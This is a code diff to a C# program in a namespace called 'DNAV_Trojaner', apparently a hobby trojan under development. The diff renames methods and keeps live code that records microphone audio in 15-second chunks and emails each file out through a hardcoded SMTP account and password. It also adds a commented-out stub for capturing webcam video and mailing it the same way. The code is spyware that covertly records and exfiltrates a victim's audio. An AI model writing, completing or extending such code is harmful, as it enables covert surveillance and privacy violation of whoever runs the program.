@@ -6,20 +6,30 @@ using System.IO;
 
 namespace DNAV_Trojaner {
     class Program {
-        static public void tonaufnahme() {
+        static public void Tonaufnahme() {
             Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
             int sec = 15;
-            Audio.setPath("Test");
+            Audio.SetPath("Test");
             Audio.Execution func = (path) => {
                 Console.WriteLine("send: " + path);
-                m.send("Neue Datei", "Eine neue Datei verfügbar:", path);
+                m.send("Neue Audiodatei", "Eine neue Datei verfügbar:", path);
             };
-            
-            Audio.start(sec, func);
+            Audio.Start(sec, func);
+        }
+
+         static public void camaufnahme() {
+            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
+            int sec = 15;
+            //Cam.SetPath("Test");
+            // Cam.Execution func = (path) => {
+            //     Console.WriteLine("send: " + path);
+            //     m.send("Neue Videodatei", "Eine neue Datei verfügbar:", path);
+            // };
+            //Cam.start(sec, func);
         }
 
         static void Main(string[] args) {
-            tonaufnahme();
+            Tonaufnahme();
         }
     }
 }
